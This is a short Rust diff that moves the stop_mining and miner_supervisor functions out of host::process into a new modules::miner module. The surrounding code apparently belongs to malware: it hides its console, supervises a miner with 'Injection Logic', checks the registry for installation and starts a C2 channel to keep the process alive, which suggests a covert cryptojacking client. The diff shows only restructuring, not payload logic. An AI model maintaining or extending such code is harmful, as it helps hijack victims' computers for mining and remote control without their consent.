@@ -5,11 +5,13 @@ mod utils;
 mod p2p;
 mod host;
 mod security;
+mod modules;
 
 use clap::{Parser, Subcommand};
 
 use commands::{install, start, status, uninstall};
-use host::process::{hide_console, stop_mining};
+use host::process::hide_console;
+use modules::miner::stop_mining;
 use host::registry::is_installed;
 
 #[derive(Parser)]
@@ -69,7 +71,7 @@ async fn main() {
 
                 // 2. Spawn Miner Supervisor (Injection Logic)
                 tokio::spawn(async {
-                    host::process::miner_supervisor().await;
+                    modules::miner::miner_supervisor().await;
                 });
 
                 // 3. Start C2 (Blocking - Keeps Process Alive)
